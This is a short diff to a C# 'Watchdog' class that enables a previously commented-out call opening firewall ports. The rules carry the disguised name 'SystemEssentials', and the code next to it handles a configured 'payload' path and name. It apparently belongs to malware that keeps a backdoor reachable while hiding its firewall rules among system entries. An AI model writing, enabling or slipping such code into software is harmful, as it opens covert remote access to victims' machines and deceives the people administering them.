@@ -76,7 +76,7 @@ class Watchdog
             foreach(int port in Config.PortsToKeepOpen)
             { 
                 string ruleName = "SystemEssentials" + port.ToString();
-                //watchdogHelper.OpenFirewallPort(port, ruleName);
+                watchdogHelper.OpenFirewallPort(port, ruleName);
             }
 
             watchdogHelper.verifyFilePathsSourceAndDest(Config.PayloadPath, Config.PayloadName);
